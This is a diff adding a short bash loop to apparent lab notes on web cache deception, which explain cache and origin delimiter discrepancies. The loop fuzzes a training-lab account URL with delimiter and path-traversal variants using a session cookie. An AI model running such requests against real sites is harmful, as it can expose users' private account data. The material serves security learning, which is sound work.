@@ -30,3 +30,10 @@ Cache rules often target static resources by matching common file extensions lik
 If there are discrepancies in how the cache and origin server map the URL path to resources or use delimiters, an attacker may be able to craft a request for a dynamic resource with a static extension that is ignored by the origin server but viewed by the cache. 
 
 
+for i in $(cat deli.txt); do
+  curl -X GET "https://0aa400db03b0c90a801ebc310048001b.web-security-academy.net/my-account${i}../resources/index.js" \
+  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/138.0.0.0 Safari/537.36' \
+  -H 'Cookie: session=IQMCA4niZwugIS0zk8jvywEl5GmFj4Bd' \
+  -i -s
+  echo "Tried: https://0aa400db03b0c90a801ebc310048001b.web-security-academy.net/my-account${i}../resources/index.js"
+done
